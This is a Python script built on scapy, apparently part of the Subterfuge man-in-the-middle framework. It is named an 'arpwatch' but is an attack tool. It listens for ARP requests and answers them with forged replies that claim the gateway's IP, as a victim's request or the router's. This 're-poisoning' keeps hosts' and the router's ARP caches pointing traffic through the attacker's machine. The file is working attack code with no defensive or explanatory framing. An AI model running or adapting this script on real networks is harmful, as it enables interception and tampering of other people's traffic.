#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import os
import sys

	#Initialize Globals
gatewayip = '' #first argument
routermac = '' #second argument
myip = '' #third argument

def arp_monitor_callback(pkt):
	if ARP in pkt and pkt[ARP].op == 1 : #who-has only
		#broadcast mac is 00:00:00:00:00:00

		#print str(pkt[ARP].hwsrc) #mac of sender
		#print str(pkt[ARP].psrc) #ip of sender
		#print str(pkt[ARP].hwdst) #mac of destination (often broadcst)
		#print str(pkt[ARP].pdst) #ip of destination (Who is ...?)
		#print ''

		if (str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and str(pkt[ARP].pdst) == gatewayip and myip != str(pkt[ARP].psrc)):
			print str(pkt[ARP].psrc) + ' is asking where the router is. Remind them kindly who the router is...'
			print ''
			#send repoison packet
			packet = ARP()
           		packet.op = 2
           		packet.psrc = gatewayip
           		packet.hwdst = str(pkt[ARP].hwsrc)
			packet.pdst = str(pkt[ARP].psrc)
			time.sleep(1)
			send(packet, verbose=0)

		elif (str(pkt[ARP].hwsrc) == routermac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and myip != str(pkt[ARP].pdst)):
			print 'Router asking where ' + str(pkt[ARP].pdst) + ' is. Remind them kindly who the real router is...'
			print ''
			#send repoison packet
			packet = ARP()
           		packet.op = 2
           		packet.psrc = gatewayip
           		packet.hwdst = '00:00:00:00:00:00'
			packet.pdst = str(pkt[ARP].pdst)
			time.sleep(1)
			send(packet, verbose=0)

		elif (str(pkt[ARP].hwsrc) == routermac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and myip == str(pkt[ARP].pdst)):	
			print 'Router asking where ' + str(pkt[ARP].pdst) + ' is. This is the Subterfuge box. Send regular reply.'
			print ''
			packet = ARP()
           		packet.op = 2
           		packet.psrc = myip
           		packet.hwdst = str(pkt[ARP].hwsrc)
			packet.pdst = str(pkt[ARP].psrc)
			time.sleep(1)
			send(packet, verbose=0)
		return None

	#Check Arguments
if len(sys.argv) < 4:
	print "Encountered an error configuring arpwatch: Invalid Arguments. Terminating..."
	exit()
else:
	gatewayip = sys.argv[1]	#first argument
	routermac = sys.argv[2]	#second argument
	myip = sys.argv[3]	#third argument
	
	print "Initializing ARPWatch..."
	print "Gateway          =>", gatewayip
	print "Router MAC       =>", routermac
	print "Local IP Address =>", myip

sniff(prn=arp_monitor_callback, filter="arp", store=0)
